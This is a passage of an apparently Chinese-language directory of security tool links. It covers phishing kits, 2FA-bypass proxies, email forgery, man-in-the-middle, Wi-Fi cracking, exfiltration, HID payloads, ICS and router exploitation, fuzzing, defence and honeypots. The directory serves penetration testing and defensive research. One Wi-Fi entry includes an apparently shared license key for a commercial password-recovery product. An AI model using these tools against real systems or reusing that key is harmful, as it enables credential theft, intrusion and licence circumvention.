上的钓鱼系统</p></li><li><p><a href="https://github.com/MSG-maniac/mail_fishing">https://github.com/MSG-maniac/mail_fishing</a> 甲方内部钓鱼系统</p></li><li><p><a href="https://github.com/samyoyo/weeman">https://github.com/samyoyo/weeman</a> 钓鱼的 http 服务器</p></li><li><p><a href="https://github.com/Raikia/FiercePhish">https://github.com/Raikia/FiercePhish</a> 可以管理所有钓鱼攻击的完整钓鱼框架，允许你跟踪单独的网络钓鱼活动，定时发送电子邮件等</p></li><li><p><a href="https://github.com/securestate/king-phisher">https://github.com/securestate/king-phisher</a> 可视化钓鱼活动工具包</p></li><li><p><a href="https://github.com/fireeye/ReelPhish">https://github.com/fireeye/ReelPhish</a> 实时双因素网络钓鱼工具</p></li><li><p><a href="https://github.com/kgretzky/evilginx">https://github.com/kgretzky/evilginx</a> 绕过双因素验证的钓鱼框架</p></li><li><p><a href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a> MiTM 框架, 登录页面钓鱼, 绕过双因素认证等</p></li><li><p><a href="https://github.com/ustayready/CredSniper">https://github.com/ustayready/CredSniper</a> 使用 Flask 和 Jinja2 模板编写的网络钓鱼框架，支持捕获 2FA 令牌</p></li><li><p><a href="https://github.com/fireeye/PwnAuth">https://github.com/fireeye/PwnAuth</a> OAuth 滥用测试检测平台</p></li><li><p><a href="https://github.com/n0pe-sled/Postfix-Server-Setup">https://github.com/n0pe-sled/Postfix-Server-Setup</a> 自动化建立一个网络钓鱼服务器</p></li><li><p><a href="https://github.com/Dionach/PhEmail">https://github.com/Dionach/PhEmail</a> py2，钓鱼与邮件伪造</p></li><li><p><a href="https://github.com/PHPMailer/PHPMailer">https://github.com/PHPMailer/PHPMailer</a> 世界上最流行的 PHP 发送邮件的代码</p></li><li><p><a href="http://tool.chacuo.net/mailanonymous">http://tool.chacuo.net/mailanonymous</a> 在线邮件伪造</p></li><li><p><a href="http://ns4gov.000webhostapp.com/">http://ns4gov.000webhostapp.com</a> 在线邮件伪造</p></li></ul><h2 id="中间人攻击流量劫持"><a href="#中间人攻击流量劫持" class="headerlink" title="中间人攻击流量劫持#"></a><strong>中间人攻击流量劫持</strong>#</h2><ul><li><p><a href="https://github.com/bettercap/bettercap">https://github.com/bettercap/bettercap</a> 网络攻击以及监控的瑞士军刀。该工具支持多种模块，比如 ARP/DNS 欺骗、TCP 以及数据包代理等</p></li><li><p><a href="https://github.com/mitmproxy/mitmproxy">https://github.com/mitmproxy/mitmproxy</a> PY,支持 SSL 拦截，进行 https 流量代理</p></li><li><p><a href="https://github.com/qiyeboy/BaseProxy">https://github.com/qiyeboy/BaseProxy</a> py3,异步 http/https 代理,楼上简化版。可以作为中间人工具，比如说替换网址图片等</p></li><li><p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a> 用于嗅探网络内所有的 NTLM、NTLMv1/v2、Net-NTLMv1/v2 包，对网络内主机进行欺骗获取用户 hash。a 拿着 b 密码请求 b，c 对 a 说我是 b，然后 c 获得了 b 的密码，<a href="https://www.secpulse.com/archives/65503.html">https://www.secpulse.com/archives/65503.html</a> 【脉搏译文系列】渗透师指南之 Responder。</p></li><li><p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a> 一款 PowerShell LLMNR / mDNS / NBNS 欺骗器和中间人工具</p></li><li><p><a href="https://github.com/LionSec/xerosploit">https://github.com/LionSec/xerosploit</a> 中间人攻击测试工具包</p></li><li><p><a href="https://github.com/AlsidOfficial/WSUSpendu">https://github.com/AlsidOfficial/WSUSpendu</a> 可以自主创建恶意更新，并将其注入到 WSUS 服务器数据库中，然后随意的分发这些恶意更新</p></li><li><p><a href="https://github.com/infobyte/evilgrade">https://github.com/infobyte/evilgrade</a> 一个模块化的脚本框架，使攻击者在不知情的情况下将恶意更新注入到用户更新中</p></li><li><p><a href="https://github.com/quickbreach/smbetray">https://github.com/quickbreach/smbetray</a> 专注于通过文件内容交换、lnk 交换来攻击客户端，以及窃取任何以明文形式传输的数据</p></li><li><p><a href="https://github.com/mrexodia/haxxmap">https://github.com/mrexodia/haxxmap</a> 对 IMAP 服务器进行中间人攻击</p></li></ul><h2 id="协议解析流量还原分析"><a href="#协议解析流量还原分析" class="headerlink" title="协议解析流量还原分析#"></a><strong>协议解析流量还原分析</strong>#</h2><ul><li><p><a href="https://github.com/wireshark/wireshark">https://github.com/wireshark/wireshark</a> 协议解析流量分析还原</p></li><li><p><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a> Impacket 是用于处理网络协议的 Python 工具包集合，内网中可用以提权例如 wmiexec.py、NMB，SMB1-3 和 MS-DCERPC 提供对协议实现本身的低级别编程访问。</p></li><li><p><a href="https://github.com/secdev/scapy">https://github.com/secdev/scapy</a> 内置了交互式网络数据包处理、数据包生成器、网络扫描器网络发现和包嗅探工具，提供多种协议包生成及解析插件，能够灵活的的生成协议数据包，并进行修改、解析。</p></li><li><p><a href="https://gitee.com/qielige/openQPA">https://gitee.com/qielige/openQPA</a> 协议分析软件 QPA 的开源代码，特点是进程抓包、特征自动分析</p></li><li><p><a href="https://github.com/jtpereyda/boofuzz">https://github.com/jtpereyda/boofuzz</a> 网络协议 fuzz 测试</p></li><li><p><a href="https://www.jianshu.com/p/4dca12a35158">https://www.jianshu.com/p/4dca12a35158</a> 5 个常用的免费报文库</p></li><li><p><a href="https://github.com/zerbea/hcxdumptool">https://github.com/zerbea/hcxdumptool</a> 从 Wlan 设备上捕获数据包</p></li><li><p><a href="https://github.com/NytroRST/NetRipper">https://github.com/NytroRST/NetRipper</a> 支持截获像 putty,winscp,mssql,chrome,firefox,outlook，https 中的明文密码</p></li><li><p><a href="https://github.com/shramos/polymorph">https://github.com/shramos/polymorph</a> 支持几乎所有现有协议的实时网络数据包操作框架</p></li><li><p><a href="https://github.com/nospaceships/raw-socket-sniffer">https://github.com/nospaceships/raw-socket-sniffer</a> C,PS，无需驱动抓取 Windows 流量</p></li></ul><h2 id="无线网络-WIFI-中间人攻击"><a href="#无线网络-WIFI-中间人攻击" class="headerlink" title="无线网络 WIFI 中间人攻击#"></a><strong>无线网络 WIFI 中间人攻击</strong>#</h2><ul><li><p><a href="https://github.com/wi-fi-analyzer/fluxion">https://github.com/wi-fi-analyzer/fluxion</a> 窃取用户 wifi 密码的进行密码重放攻击</p></li><li><p><a href="https://github.com/0v3rl0w/e013">https://github.com/0v3rl0w/e013</a> 窃取 Wifi 密码. VB 脚本</p></li><li><p><a href="https://github.com/cls1991/ng">https://github.com/cls1991/ng</a> 获取你当前连接 wifi 的密码与 ip</p></li><li><p><a href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a> PY,中间人攻击，FakeAp 恶意热点，WIFI 钓鱼，凭证窃取</p></li><li><p><a href="https://github.com/1N3/PRISM-AP">https://github.com/1N3/PRISM-AP</a> 自动部署 RogueAP(恶意热点) MITM 攻击框架</p></li><li><p><a href="https://github.com/sensepost/mana">https://github.com/sensepost/mana</a> Wifi 劫持工具，可以监听计算机或其他移动设备的 Wifi 通信，并能够模仿该设备</p></li><li><p><a href="https://github.com/deltaxflux/fluxion">https://github.com/deltaxflux/fluxion</a> bash 与 py，对使用 wpa 协议的无线网络进行 MiTM 攻击</p></li><li><p><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a> ARP 欺骗，无线网络劫持</p></li></ul><h2 id="无线网络-WIFI-防御"><a href="#无线网络-WIFI-防御" class="headerlink" title="无线网络 WIFI 防御#"></a><strong>无线网络 WIFI 防御</strong>#</h2><ul><li><p><a href="https://github.com/SYWorks/waidps">https://github.com/SYWorks/waidps</a> PY,Linux 下无线网络入侵检测工具</p></li><li><p><a href="https://github.com/SkypLabs/probequest">https://github.com/SkypLabs/probequest</a> 嗅探和显示无线网卡附近的 Wifi Probe 请求</p></li><li><p><a href="https://github.com/wangshub/hmpa-pi">https://github.com/wangshub/hmpa-pi</a> 在树莓派或路由，利用 Wireshark 扫描附近网络 WiFi 设备，当有手机或其它 Wi-Fi 设备在附近时，通过邮件或者微信提醒</p></li><li><p><a href="https://github.com/besimaltnok/PiFinger">https://github.com/besimaltnok/PiFinger</a> 检查 wifi 是否为”Wifi-Pineapple 大菠萝”所开放的恶意热点</p></li><li><p><a href="https://github.com/WiPi-Hunter/PiSavar">https://github.com/WiPi-Hunter/PiSavar</a> 利用 PineAP，对于 FAKE AP 虚假接入点，如”Wifi-Pineapple 大菠萝”进行监测</p></li></ul><h2 id="无线网络-WIFI-审计测试"><a href="#无线网络-WIFI-审计测试" class="headerlink" title="无线网络 WIFI 审计测试#"></a><strong>无线网络 WIFI 审计测试</strong>#</h2><ul><li><p><a href="https://www.wifislax.com/">https://www.wifislax.com</a> 西班牙 wifi 审计系统，国内汉化版为无线革新 5.1.1 Wifislax-WRC</p></li><li><p><a href="https://cn.elcomsoft.com/ewsa.html">https://cn.elcomsoft.com/ewsa.html</a> ewsa，wifi 嗅探，握手包密码还原，EWSA-173-HC1UW-L3EGT-FFJ3O-SOQB3</p></li><li><p><a href="https://www.passcape.com/">https://www.passcape.com</a> wifipr，握手包密码还原，另外还有许多商业版 windows 下密码还原工具</p></li><li><p><a href="https://github.com/MisterBianco/BoopSuite">https://github.com/MisterBianco/BoopSuite</a> 无线网络审计工具，支持 2-5GHZ 频段</p></li><li><p><a href="https://github.com/aircrack-ng/aircrack-ng">https://github.com/aircrack-ng/aircrack-ng</a> 由数据包嗅探器、检测器、WPA / WPA2-PSK 解密器、WEP 和用于 802.11 无线局域网的分析工具组成</p></li><li><p><a href="https://github.com/t6x/reaver-wps-fork-t6x">https://github.com/t6x/reaver-wps-fork-t6x</a> wps 跑 pin 码攻击，常见 wifi 攻击</p></li><li><p><a href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a> wifite 无线审计工具升级版，联动 aircrack-ng 与 reaver</p></li><li><p><a href="https://github.com/savio-code/fern-wifi-cracker">https://github.com/savio-code/fern-wifi-cracker</a> 无线安全审计工具</p></li><li><p><a href="https://github.com/P0cL4bs/WiFi-Pumpkin">https://github.com/P0cL4bs/WiFi-Pumpkin</a> 无线安全渗透测试套件</p></li><li><p><a href="https://github.com/entropy1337/infernal-twin">https://github.com/entropy1337/infernal-twin</a> 自动化无线攻击工具 Infernal-Wireless</p></li><li><p><a href="https://github.com/m4n3dw0lf/PytheM">https://github.com/m4n3dw0lf/PytheM</a> Python 网络/渗透测试工具</p></li><li><p><a href="https://github.com/InfamousSYN/rogue">https://github.com/InfamousSYN/rogue</a> 无线网络攻击工具包</p></li><li><p><a href="https://github.com/cSploit/android">https://github.com/cSploit/android</a> 手机 WiFi 渗透工具框架，可以使用 msf</p></li><li><p><a href="https://github.com/chrisk44/Hijacker">https://github.com/chrisk44/Hijacker</a> 手机 wifi 测试工具</p></li><li><p><a href="https://andrax-pentest.org/">https://andrax-pentest.org/</a> kali hunter 手机渗透测试系统</p></li><li><p><a href="https://www.zimperium.com/zanti-mobile-penetration-testing">https://www.zimperium.com/zanti-mobile-penetration-testing</a> 手机 wifi 渗透工具</p></li></ul><h2 id="数据取回隐秘传输"><a href="#数据取回隐秘传输" class="headerlink" title="数据取回隐秘传输#"></a><strong>数据取回隐秘传输</strong>#</h2><ul><li><p><a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a> 躲避 DLP/MLS 数据泄露防护系统，突破数据白名单控制，躲避 AV 检测进行数据盗取</p></li><li><p><a href="https://github.com/sensepost/DET">https://github.com/sensepost/DET</a> 使用单个或多个通道同时执行数据取回</p></li><li><p><a href="https://github.com/Arno0x/DNSExfiltrator">https://github.com/Arno0x/DNSExfiltrator</a> 利用 DNS 解析进行数据隐秘传输的工具</p></li><li><p><a href="https://github.com/ytisf/PyExfil">https://github.com/ytisf/PyExfil</a> 用于数据取回的 Python 软件包</p></li><li><p><a href="https://github.com/Arno0x/ReflectiveDnsExfiltrator">https://github.com/Arno0x/ReflectiveDnsExfiltrator</a> 反射 DNS 解析隐蔽通道进行数据泄露</p></li></ul><h2 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全#"></a><strong>硬件安全</strong>#</h2><ul><li><p><a href="https://github.com/unprovable/PentestHardware">https://github.com/unprovable/PentestHardware</a> 硬件渗透测试实用手册</p></li><li><p><a href="https://ducktoolkit.com/">https://ducktoolkit.com/</a> 橡皮鸭、HID 键盘模拟器</p></li><li><p><a href="https://github.com/insecurityofthings/jackit">https://github.com/insecurityofthings/jackit</a> 用于 Mousejack 的开发代码</p></li><li><p><a href="https://github.com/samyk/magspoof">https://github.com/samyk/magspoof</a> 信用卡信息盗取</p></li><li><p><a href="https://github.com/mame82/P4wnP1_aloa">https://github.com/mame82/P4wnP1_aloa</a> 在树莓派 Raspberry Pi 上安装常用的测试组件，打造移动测试平台</p></li><li><p><a href="https://www.freebuf.com/geek/195631.html">https://www.freebuf.com/geek/195631.html</a> 成为物理黑客吧！利用树莓派实现 P4wnP1 项目进行渗透测试</p></li><li><p><a href="https://github.com/mame82/P4wnP1">https://github.com/mame82/P4wnP1</a> 在树莓派安装网络劫持键盘注入(WHID)工具</p></li><li><p><a href="https://github.com/ebursztein/malusb">https://github.com/ebursztein/malusb</a> 创建跨平台的 HID 欺骗 payload，并在 Windows 和 OSX 上建立反向 TCP-shell</p></li><li><p><a href="https://github.com/Orange-Cyberdefense/fenrir-ocd">https://github.com/Orange-Cyberdefense/fenrir-ocd</a> 主要功能和用途是绕过有线 802.1x 保护并使你能够访问目标网络</p></li><li><p><a href="https://github.com/360PegasusTeam/GhostTunnel">https://github.com/360PegasusTeam/GhostTunnel</a> 可在隔离环境下使用 HID 生成隐蔽后门，释放有效负载后删除自身</p></li><li><p><a href="https://github.com/LennyLeng/RadioEye">https://github.com/LennyLeng/RadioEye</a> RFID 配合常见的 NFC 使用</p></li><li><p><a href="https://github.com/Proxmark/proxmark3/">https://github.com/Proxmark/proxmark3/</a> RFID 神器 PM3</p></li><li><p><a href="http://www.freebuf.com/news/others/605.html">http://www.freebuf.com/news/others/605.html</a> RFID Hacking–资源大合集</p></li><li><p><a href="https://github.com/UnicornTeam/HackCube-Special">https://github.com/UnicornTeam/HackCube-Special</a> 独角兽实验室硬件渗透测试平台</p></li></ul><h2 id="IoT-安全"><a href="#IoT-安全" class="headerlink" title="IoT 安全#"></a><strong>IoT 安全</strong>#</h2><ul><li><p><a href="https://github.com/w3h/icsmaster">https://github.com/w3h/icsmaster</a> 整合工控安全资源</p></li><li><p><a href="https://github.com/V33RU/IoTSecurity101">https://github.com/V33RU/IoTSecurity101</a> IoT 工控安全与物联网安全学习的一些文章和资源</p></li><li><p><a href="http://www.freebuf.com/ics-articles">http://www.freebuf.com/ics-articles</a> 工控相关</p></li><li><p><a href="http://www.freebuf.com/sectool/174567.html">http://www.freebuf.com/sectool/174567.html</a> 工业控制系统（ICS）安全专家必备的测试工具和安全资源</p></li><li><p><a href="http://www.freebuf.com/articles/ics-articles/178822.html">http://www.freebuf.com/articles/ics-articles/178822.html</a> 浅析煤炭企业如何进行工控安全建设</p></li><li><p><a href="http://www.freebuf.com/articles/network/178251.html">http://www.freebuf.com/articles/network/178251.html</a> 工控安全现场实施经验谈之工控系统如何加强主机防护</p></li><li><p><a href="https://github.com/hslatman/awesome-industrial-control-system-security">https://github.com/hslatman/awesome-industrial-control-system-security</a> 工控系统安全方向优秀资源收集仓库</p></li><li><p><a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a> IoT 集成安全测试系统，带有一些常用的软件</p></li><li><p><a href="https://github.com/moki-ics/moki">https://github.com/moki-ics/moki</a> 一键配置类似 kali 的工控渗透测试系统的脚本，</p></li><li><p><a href="https://gitlab.com/expliot_framework/expliot">https://gitlab.com/expliot_framework/expliot</a> py3，工控安全漏洞测试框架</p></li><li><p><a href="https://github.com/dark-lbp/isf">https://github.com/dark-lbp/isf</a> py2,工控中类似 msf 的测试框架</p></li><li><p><a href="https://github.com/enddo/smod">https://github.com/enddo/smod</a> py2，使用了 scapy 模块，主要针对 modbus 协议测试</p></li><li><p><a href="https://github.com/shodan-labs/iotdb">https://github.com/shodan-labs/iotdb</a> nmap 配合 shodan API 扫描 IoT 设备</p></li><li><p><a href="https://github.com/XHermitOne/icscanner">https://github.com/XHermitOne/icscanner</a> 带界面的 ics 扫描器</p></li><li><p><a href="https://github.com/yanlinlin82/plcscan">https://github.com/yanlinlin82/plcscan</a> 通过 TCP/102 和 TCP/502 识别互联网上 PLC 设备和其他 Modbus 设备</p></li><li><p><a href="https://github.com/nsacyber/GRASSMARLIN">https://github.com/nsacyber/GRASSMARLIN</a> NSA 旗下 ICS/SCADA 态势感知</p></li><li><p><a href="https://github.com/nezza/scada-stuff">https://github.com/nezza/scada-stuff</a> 对 SCADA/ICS 设备进行逆向与攻击</p></li></ul><h2 id="摄像头安全"><a href="#摄像头安全" class="headerlink" title="摄像头安全#"></a><strong>摄像头安全</strong>#</h2><ul><li><p><a href="https://github.com/woj-ciech/kamerka">https://github.com/woj-ciech/kamerka</a> 配合 shodan API 扫描到的摄像头地理位置显示在地图上</p></li><li><p><a href="https://github.com/Ullaakut/cameradar">https://github.com/Ullaakut/cameradar</a> GO,针对摄像头 RTSP 协议渗透测试，附弱口令字典</p></li><li><p><a href="https://github.com/Ullaakut/camerattack">https://github.com/Ullaakut/camerattack</a> GO,摄像头远程禁用</p></li><li><p><a href="https://github.com/NIteshx2/UltimateSecurityCam">https://github.com/NIteshx2/UltimateSecurityCam</a> py3，摄像头监测外来人员软件，有防欺骗设置</p></li></ul><h2 id="路由安全"><a href="#路由安全" class="headerlink" title="路由安全#"></a><strong>路由安全</strong>#</h2><ul><li><p><a href="http://stascorp.com/">http://stascorp.com</a> RouterScan 毛子开发的路由器漏洞利用工具，界面化很强大</p></li><li><p><a href="https://github.com/threat9/routersploit">https://github.com/threat9/routersploit</a> py3，仿 msf 路由器漏洞利用框架</p></li><li><p><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a> 已停止更新，路由器漏洞扫描利用</p></li><li><p><a href="https://github.com/googleinurl/RouterHunterBR">https://github.com/googleinurl/RouterHunterBR</a> php，路由器设备漏洞扫描利用</p></li><li><p><a href="https://github.com/scu-igroup/telnet-scanner">https://github.com/scu-igroup/telnet-scanner</a> Telnet 服务密码撞库</p></li></ul><h2 id="物联网安全"><a href="#物联网安全" class="headerlink" title="物联网安全#"></a><strong>物联网安全</strong>#</h2><ul><li><p><a href="https://github.com/RUB-NDS/PRET">https://github.com/RUB-NDS/PRET</a> 打印机攻击框架</p></li><li><p><a href="https://github.com/rapid7/IoTSeeker">https://github.com/rapid7/IoTSeeker</a> 物联网设备默认密码扫描检测工具</p></li><li><p><a href="https://github.com/schutzwerk/CANalyzat0r">https://github.com/schutzwerk/CANalyzat0r</a> 专有汽车协议的安全分析工具包</p></li><li><p><a href="https://github.com/pasta-auto">https://github.com/pasta-auto</a> 智能汽车测试</p></li></ul><h2 id="Fuzz-模糊测试漏洞挖掘"><a href="#Fuzz-模糊测试漏洞挖掘" class="headerlink" title="Fuzz 模糊测试漏洞挖掘#"></a><strong>Fuzz 模糊测试漏洞挖掘</strong>#</h2><ul><li><p><a href="http://www.freebuf.com/articles/rookie/169413.html">http://www.freebuf.com/articles/rookie/169413.html</a> 一系列用于 Fuzzing 学习的资源汇总</p></li><li><p><a href="https://github.com/secfigo/Awesome-Fuzzing">https://github.com/secfigo/Awesome-Fuzzing</a> Fuzz 相关学习资料</p></li><li><p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a> fuzz 资料数据库</p></li><li><p><a href="https://github.com/ivanfratric/winafl">https://github.com/ivanfratric/winafl</a> AFL for fuzzing Windows binaries,原创技术分析 | AFL 漏洞挖掘技术漫谈</p></li><li><p><a href="https://github.com/attekett/NodeFuzz">https://github.com/attekett/NodeFuzz</a> a fuzzer harness for web browsers and browser like applications.</p></li><li><p><a href="https://github.com/google/oss-fuzz">https://github.com/google/oss-fuzz</a> Continuous Fuzzing for Open Source Software</p></li><li><p><a href="http://blog.topsec.com.cn/ad_lab/alphafuzzer/">http://blog.topsec.com.cn/ad_lab/alphafuzzer/</a> 以文件格式为主的漏洞挖掘工具</p></li><li><p><a href="https://bbs.ichunqiu.com/thread-24898-1-1.html">https://bbs.ichunqiu.com/thread-24898-1-1.html</a> Test404 -HTTP Fuzzer V3.0</p></li><li><p><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a> py，Web 安全模糊测试工具，模块化可处理 burp 所抓请求和响应报文</p></li><li><p><a href="https://github.com/1N3/BlackWidow">https://github.com/1N3/BlackWidow</a> 基于 Python 实现的 Web 爬虫，用于收集目标网站的情报信息并对 OWASP 漏洞进行模糊测试</p></li><li><p><a href="https://github.com/bunzen/pySSDeep">https://github.com/bunzen/pySSDeep</a> py，一个基于模糊哈希（Fuzzy Hashing）算法的工具。go，glaslos/ssdeep；C，ssdeep-project/ssdeep</p></li><li></li></ul><p>o<a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a> AFL 针对 Windows 二进制进行测试</p><h2 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护#"></a><strong>安全防护</strong>#</h2><ul><li><p><a href="https://github.com/baidu/AdvBox">https://github.com/baidu/AdvBox</a> Advbox 是支持多种深度学习平台的 AI 模型安全工具箱，既支持白盒和黑盒算法生成对抗样本，衡量 AI 模型鲁棒性，也支持常见的防御算法</p></li><li><p><a href="https://github.com/quoscient/octopus">https://github.com/quoscient/octopus</a> 区块链智能合约安全分析工具</p></li><li><p><a href="https://github.com/Cyb3rWard0g/HELK">https://github.com/Cyb3rWard0g/HELK</a> 具有高级分析功能的威胁狩猎 ELK</p></li><li><p><a href="https://github.com/trimstray/otseca">https://github.com/trimstray/otseca</a> linux 系统审计工具，可以导出系统配置，生成报表</p></li><li><p><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a> 一款基于 django 监控 DNS 解析记录和 HTTP 访问记录的工具，可以配合盲注、xss、解析对方真实 ip 使用</p></li><li><p><a href="https://github.com/mwrlabs/dref">https://github.com/mwrlabs/dref</a> DNS 重绑定利用框架</p></li><li><p><a href="https://github.com/chengr28/Pcap_DNSProxy/blob/master/README.zh-Hans.md">https://github.com/chengr28/Pcap_DNSProxy/blob/master/README.zh-Hans.md</a> Pcap_DNSProxy 是一个基于 WinPcap/LibPcap 用于过滤 DNS 投毒污染的工具</p></li><li><p><a href="https://github.com/PlagueScanner/PlagueScanner">https://github.com/PlagueScanner/PlagueScanner</a> 使用 python 实现的集成 ClamAV、ESET、Bitdefender 的反病毒引擎</p></li><li><p><a href="https://github.com/m4rco-/dorothy2">https://github.com/m4rco-/dorothy2</a> 一款木马、僵尸网络分析框架</p></li><li><p><a href="http://github.com/jumpserver/jumpserver">http://github.com/jumpserver/jumpserver</a> 基于 Python3 的开源堡垒机</p></li><li><p><a href="https://github.com/github/glb-director">https://github.com/github/glb-director</a> 负载均衡组件 GLB，数据解析使用了 dpdk</p></li><li><p><a href="https://github.com/processhacker/processhacker">https://github.com/processhacker/processhacker</a> 监控系统资源、软件调试、检测恶意软件，管理进程</p></li><li><p><a href="https://github.com/TKCERT/mail-security-tester">https://github.com/TKCERT/mail-security-tester</a> 检测邮件防护与过滤系统的测试框架</p></li><li><p><a href="https://github.com/chaitin/sqlchop-http-proxy">https://github.com/chaitin/sqlchop-http-proxy</a> 利用 HTTP 反向代理，内置 SQLChop 作为 SQL 注入攻击检测模块，可以拦截 SQL 注入流量而放行正常流量</p></li><li><p><a href="https://github.com/OWASP/SecureTea-Project">https://github.com/OWASP/SecureTea-Project</a> 当有人私自触碰电脑鼠标或触摸板，进行报警</p></li></ul><h2 id="代码审计应用测试"><a href="#代码审计应用测试" class="headerlink" title="代码审计应用测试#"></a><strong>代码审计应用测试</strong>#</h2><ul><li><p><a href="https://www.waitalone.cn/seay-source-code-auditv2.html">https://www.waitalone.cn/seay-source-code-auditv2.html</a> Seay 源代码审计系统 2.1 版本</p></li><li><p><a href="https://github.com/pyupio/safety">https://github.com/pyupio/safety</a> 检查所有已安装 Python 包, 查找已知的安全漏洞</p></li><li><p><a href="https://github.com/pumasecurity/puma-scan">https://github.com/pumasecurity/puma-scan</a> 实时代码审计，vs 插件</p></li><li><p><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a> 白盒代码安全审计系统</p></li><li><p><a href="https://github.com/OneSourceCat/phpvulhunter">https://github.com/OneSourceCat/phpvulhunter</a> 静态 php 代码审计</p></li><li><p><a href="https://github.com/ripsscanner/rips">https://github.com/ripsscanner/rips</a> 基于 php 的 php 代码审计工具</p></li><li><p><a href="https://github.com/Qihoo360/phptrace">https://github.com/Qihoo360/phptrace</a> 跟踪、分析 PHP 运行情况的工具</p></li><li><p><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a> Node.JS 应用代码审计</p></li><li><p><a href="https://github.com/ctxis/beemka">https://github.com/ctxis/beemka</a> 针对 Electron App 的漏洞利用工具包</p></li><li><p><a href="https://github.com/doyensec/electronegativity">https://github.com/doyensec/electronegativity</a> Electron 应用代码审计，App 的错误配置和安全问题</p></li><li><p><a href="https://github.com/shengqi158/pyvulhunter">https://github.com/shengqi158/pyvulhunter</a> Python 应用审计</p></li><li><p><a href="https://github.com/securego/gosec">https://github.com/securego/gosec</a> Go 语言源码安全分析工具</p></li><li><p><a href="https://github.com/GoSSIP-SJTU/TripleDoggy">https://github.com/GoSSIP-SJTU/TripleDoggy</a> 基于 clang 的 c/c++/object-c 源代码检测框架，有大量接口可以被调用</p></li><li><p><a href="https://github.com/ga0/pyprotect">https://github.com/ga0/pyprotect</a> 给 python 代码加密，防止逆向</p></li><li><p><a href="https://github.com/presidentbeef/brakeman">https://github.com/presidentbeef/brakeman</a> Ruby on Rails 应用静态代码分析</p></li><li><p><a href="https://github.com/python-security/pyt">https://github.com/python-security/pyt</a> 用于检测 Python Web 应用程序中的安全漏洞的静态分析工具</p></li><li><p><a href="https://github.com/m4ll0k/WPSploit">https://github.com/m4ll0k/WPSploit</a> WordPress 插件代码安全审计</p></li><li><p><a href="https://github.com/elcodigok/wphardening">https://github.com/elcodigok/wphardening</a> 加强任何 WordPress 安装的安全</p></li></ul><h2 id="大数据平台安全"><a href="#大数据平台安全" class="headerlink" title="大数据平台安全#"></a><strong>大数据平台安全</strong>#</h2><ul><li><p><a href="https://github.com/shouc/BDA">https://github.com/shouc/BDA</a> 针对 hadoop/spark/mysql 等大数据平台的审计与检测</p></li><li><p><a href="https://github.com/wavestone-cdt/hadoop-attack-library">https://github.com/wavestone-cdt/hadoop-attack-library</a> hadoop 测试方式和工具集</p></li></ul><h2 id="蜜罐安全"><a href="#蜜罐安全" class="headerlink" title="蜜罐安全#"></a><strong>蜜罐安全</strong>#</h2><ul><li><p><a href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a> 蜜罐开源技术收集</p></li><li><p><a href="https://github.com/threatstream/mhn">https://github.com/threatstream/mhn</a> 现代蜜网，集成了多种蜜罐的安装脚本，可以快速部署、使用，也能够快速的从节点收集数据</p></li><li><p><a href="https://github.com/dtag-dev-sec/tpotce">https://github.com/dtag-dev-sec/tpotce</a> T-POT，里面使用 docker 技术实现多个蜜罐组合，配合 ELK 进行研究与数据捕获</p></li><li><p><a href="https://www.freebuf.com/sectool/190840.html">https://www.freebuf.com/sectool/190840.html</a> T-Pot 多蜜罐平台使用心法</p></li><li><p><a href="https://github.com/n3uz/t-pot-autoinstall">https://github.com/n3uz/t-pot-autoinstall</a> 将 fork 的 T-POT 蜜罐的一键安装脚本替换为国内加速镜像</p></li></ul><h2 id="Web-蜜罐内网监测"><a href="#Web-蜜罐内网监测" class="headerlink" title="Web 蜜罐内网监测#"></a><strong>Web 蜜罐内网监测</strong>#</h2><ul><li><p><a href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a> py2，使用 ELK（ElasticSearch，LogStash，Kibana）进行数据分析，目前支持 ssh，telnet，sftp 等协议</p></li><li><p><a href="https://github.com/mushorg/snare">https://github.com/mushorg/snare</a> py3，web 安全蜜罐，可克隆指定 Web 页面</p></li><li><p><a href="https://github.com/honeynet/beeswarm">https://github.com/honeynet/beeswarm</a> py，使用 agent 探针与蜜罐进行实时交互来引诱攻击者</p></li><li><p><a href="https://github.com/thinkst/opencanary">https://github.com/thinkst/opencanary</a> PY2,SNMP\RDP\SAMBA 蜜罐</p></li><li><p><a href="https://github.com/p1r06u3/opencanary_web">https://github.com/p1r06u3/opencanary_web</a> PY,TORNADO,内网低交互蜜罐。支持自动化安装，目前支持常见的 16 中协议，现为探针/蜜罐-管理的架构，可以考虑二次开发为探针-沙盒-管理的架构</p></li><li><p><a href="https://github.com/p1r06u3/opencanary_web">https://github.com/p1r06u3/opencanary_web</a></p></li><li><p><a href="https://github.com/Cymmetria">https://github.com/Cymmetria</a> 知名欺骗防御蜜罐组织。Struct、weblogic、telnet、Cisco ASA、Micros 等仿真蜜罐</p></li><li><p><a href="https://github.com/Cymmetria/honeycomb">https://github.com/Cymmetria/honeycomb</a> Cymmetria 公司开源蜜罐框架，低交互</p></li><li><p><a href="https://github.com/honeytrap/honeytrap">https://github.com/honeytrap/honeytrap</a> 可扩展蜜罐框架，支持探针部署与高交互蜜罐</p></li><li><p><a href="https://gosecure.net/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/">https://gosecure.net/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/</a> RDP 